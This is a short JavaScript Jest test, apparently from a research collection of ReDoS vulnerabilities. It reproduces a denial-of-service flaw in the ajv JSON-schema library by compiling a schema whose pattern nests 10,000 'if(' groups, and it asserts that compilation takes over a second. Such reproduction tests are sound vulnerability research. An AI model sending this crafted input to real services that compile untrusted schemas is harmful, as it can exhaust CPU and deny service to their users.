//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-ajv.js
test("ReDoS in ajv", () => {  
  const measureTime = require("./utils").measureTime;
  let Ajv = require("ajv");
  let ajv = new Ajv();
  
  let t = measureTime(function () {
    ajv.compile({
      type: "object",
      properties: {
        foo: {
          type: "string",
          oneOf: [{ pattern: "if(".repeat(10000) + "x" + ")".repeat(10000) }],
        },
      },
    });
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
